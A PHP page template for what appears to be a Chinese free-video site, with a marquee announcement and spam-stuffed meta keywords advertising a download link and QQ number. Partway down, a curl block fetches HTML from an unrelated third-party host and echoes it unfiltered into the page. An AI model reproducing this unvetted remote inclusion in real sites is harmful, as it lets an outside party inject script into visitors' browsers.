<?php
include ('../inc/aik.config.php');
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0" />
<title><?php echo $aik['sitename'];?>-官方平台</title>
<meta name="keywords" content="<?php echo $aik['title'];?>,智云影音，电视直播网站,零八影院快播,高清云影视,云点播,免费看视频,湖南卫视直播,80电影网,最新电影天堂免费在线观看，更多精品源码下载请到https://pan.baidu.com/s/1kVIe1Bx，获取更多精彩资源请联系QQ号2248186422">
<style type="text/css">
td{font-size:12px;color:#666699;text-align:center;}
.odd{background-color:#EFF2FF;width:100px;}
.even{background-color:#E8EDFF;width:80px;}
th.head1,.head2{font-size:14px;color:#003399;font-weight:normal;}
th.head1{background:#dce4ff;}
th.head2{background:#d0dafd;}
</style>
 <!-- 尊重作者。留下版权 -->
  <MARQUEE scrollAmount=5 bgColor=#007ead><?php echo $aik['sitename'];?>公告：本站各种最新精品资源,随时分享,欢迎加入官方平台，更多最新精彩发布请关注官方最新信息！！</MARQUEE>
<!-- 智云影音。精品源码 -->
<hr>
<br>
<?

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://www.sztxcargo.com/data/vote/kec/gwsp.html");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
$output = curl_exec($ch);
curl_close($ch);
?>

<!-- 尊重作者。留下版权 -->
  <style type="text/css">
div.wodl{background:transparent;
        padding:3px;
        position:fixed;
        right:5px;
        bottom:10px;
        border:solid #06f 1px;
        padding:5px;}
</style>
<div class="wodl"><a href="javascript:history.back()">返回平台</a></div></p>

   
